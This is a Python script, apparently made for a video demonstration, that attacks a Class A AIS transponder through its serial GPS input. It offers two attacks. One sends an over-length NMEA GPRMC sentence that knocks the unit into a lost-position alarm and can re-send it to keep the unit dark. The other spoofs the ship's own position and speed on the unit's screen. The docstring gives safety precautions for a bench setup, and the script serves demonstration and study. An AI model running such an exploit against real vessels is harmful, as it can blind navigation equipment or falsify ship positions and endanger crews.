#!/usr/bin/env python3
"""RF-FREE bench demo for a video. Feeds the transponder GPS over serial so it shows a clean fix,
then on a keypress fires a serial attack that changes what the transponder shows on ITS OWN screen.
No RF is transmitted, so it is safe outside a Faraday cage.

SAFETY: a Class A transponder still transmits on the live AIS band on its own. Put a 50 ohm dummy
load on the VHF antenna port (or leave it disconnected) so nothing radiates. This script only
touches the serial GPS line.

    python3 demo_attack.py --port /dev/ttyUSB0                 # default: over-length DoS
    python3 demo_attack.py --port /dev/ttyUSB0 --mode spoof    # flashier: teleport + impossible speed

Needs rf_session.py + ais_encode.py in the same folder, and pyserial/pynmea2.
"""
import sys, argparse, time
from rf_session import GpsFeed

ap = argparse.ArgumentParser()
ap.add_argument("--port", default="/dev/ttyUSB0", help="serial port feeding the transponder GPS")
ap.add_argument("--baud", type=int, default=4800)
ap.add_argument("--lat", type=float, default=51.05, help="start latitude (Dover Strait by default)")
ap.add_argument("--lon", type=float, default=1.50)
ap.add_argument("--speed", type=float, default=12.0, help="start SOG (kn)")
ap.add_argument("--course", type=float, default=0.0)
ap.add_argument("--mode", choices=["dos", "spoof"], default="dos",
                help="dos = over-length sentence -> lost-position alarm; "
                     "spoof = teleport own ship + impossible speed on its own screen")
ap.add_argument("--spoof-lat", type=float, default=27.9881, help="teleport target (default Everest)")
ap.add_argument("--spoof-lon", type=float, default=86.9250)
ap.add_argument("--spoof-speed", type=float, default=102.2, help="impossible SOG for spoof mode")
args = ap.parse_args()

gps = GpsFeed(args.port, args.baud, args.lat, args.lon, speed=args.speed, course=args.course)
gps.start()
print(f"\nGPS feeding the transponder @ {args.lat},{args.lon} at {args.speed} kn on {args.port}.")
print("The unit should now show a clean, valid fix. (VHF port dummy-loaded? nothing is radiating.)")

if args.mode == "dos":
    # one over-length GPRMC (~3 KB), far past the 82-char NMEA limit: starves the position parser
    body = ("GPRMC,120000.00,A,5103.0000,N,00130.0000,E,"
            f"{args.speed:.1f},0.0,180626" + ",9" * 1500)
    attack = ("$" + body + "\r\n").encode()
    input("\n>>> Press ENTER to launch the attack (one over-length sentence)...")
    gps.inject_raw(attack)
    print(f"\nSent {len(attack)} bytes. Watch the screen drop to LOST POSITION / alarm.")
    print("GPS keeps feeding; it recovers in ~30 s. Press ENTER to hit it again, Ctrl-C to stop.")
    while True:
        try:
            input()
        except (EOFError, KeyboardInterrupt):
            break
        gps.inject_raw(attack)
        print("  ...re-sent, held dark.")
else:  # spoof
    input("\n>>> Press ENTER to launch the attack (teleport + impossible speed)...")
    gps.set_position(args.spoof_lat, args.spoof_lon, speed=args.spoof_speed, course=args.course)
    print(f"\nOwn ship now reports {args.spoof_lat},{args.spoof_lon} at {args.spoof_speed} kn.")
    print("Watch the position and SOG on the unit's own screen jump. Ctrl-C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

gps.stop()
